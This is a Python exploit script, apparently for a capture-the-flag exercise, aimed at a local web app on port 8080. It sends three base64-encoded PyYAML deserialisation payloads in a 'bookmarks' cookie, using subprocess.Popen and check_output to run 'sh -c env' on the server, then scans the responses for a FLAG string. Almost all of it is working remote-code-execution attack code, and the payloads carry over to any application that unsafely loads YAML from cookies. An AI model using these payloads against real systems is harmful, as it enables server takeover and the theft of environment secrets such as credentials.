import requests
import base64
import re
import time

target_url = "http://127.0.0.1:8080/"
user_cookie = "aea729d9fd8b4083b533db2c69e8e238"

# Method 1: Using subprocess.Popen with liststyle arguments
yaml_v1 = """!!python/object/apply:subprocess.Popen
- [sh, -c, 'env']
- {stdout: !!python/name:subprocess.PIPE }
"""

# Method 2: Using os.system (simpler but no output capture)
yaml_v2 = """!!python/object/apply:subprocess.check_output
args: [[sh, -c, env]]
"""

# Method 3: Direct list format
yaml_v3 = """!!python/object/apply:subprocess.check_output
[[sh, -c, env]]
"""

payloads = [
    ("Method 1: Popen", yaml_v1),
    ("Method 2: check_output with args", yaml_v2),
    ("Method 3: check_output direct", yaml_v3)
]

for name, payload in payloads:
    print(f"\n{'='*80}")
    print(f"[*] Testing: {name}")
    print(f"{'='*80}")
    print(f"Payload:\n{payload}")
    
    encoded = base64.b64encode(payload.encode()).decode()
    cookies = {'user': user_cookie, 'bookmarks': encoded}
    
    try:
        resp = requests.get(target_url, cookies=cookies, timeout=5, allow_redirects=True)
        print(f"\n[+] Status: {resp.status_code}")
        print(f"[+] Response ({len(resp.text)} bytes):")
        print(resp.text)
        
        # Search for FLAG
        if 'FLAG{' in resp.text:
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                for flag in flags:
                    print(f"\n[!!!] FLAG FOUND: {flag}")
        
    except requests.exceptions.Timeout:
        print("[!] Request timeout - server may have crashed")
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
    except Exception as e:
        print(f"[!] Error: {type(e).__name__}: {e}")
    
    time.sleep(1)  # Brief pause between requests

print("\n" + "="*80)
print("[*] All tests completed")

